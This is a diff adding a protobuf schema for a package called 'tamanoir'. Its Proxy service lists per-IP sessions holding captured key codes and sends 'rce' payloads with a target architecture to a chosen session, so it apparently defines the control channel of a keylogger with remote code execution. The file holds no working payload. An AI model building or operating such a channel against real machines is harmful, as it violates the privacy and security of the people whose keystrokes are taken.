@@ -1,0 +1,40 @@
+syntax = "proto3";
+
+package tamanoir;
+
+service Greeter {
+  rpc SayHello (HelloRequest) returns (HelloReply) {}
+}
+
+message HelloRequest {
+  string name = 1;
+}
+
+message HelloReply {
+  string message = 1;
+}
+
+message NoArgs {}
+message StatusResponse {
+  bool success=1;
+  string err=2;
+}
+
+message GetSessionsResponse {
+  repeated SessionResponse sessions = 1;
+}
+
+message SessionResponse {
+  string ip =1;
+  repeated uint32 key_codes=2; 
+}
+message SetSessionRceRequest {
+  string ip=1;
+  string rce=2;
+  string target_arch=3;
+}
+
+service Proxy {
+  rpc GetSessions (NoArgs) returns (GetSessionsResponse) {}
+  rpc SetSessionRce (SetSessionRceRequest) returns (NoArgs) {}
+}
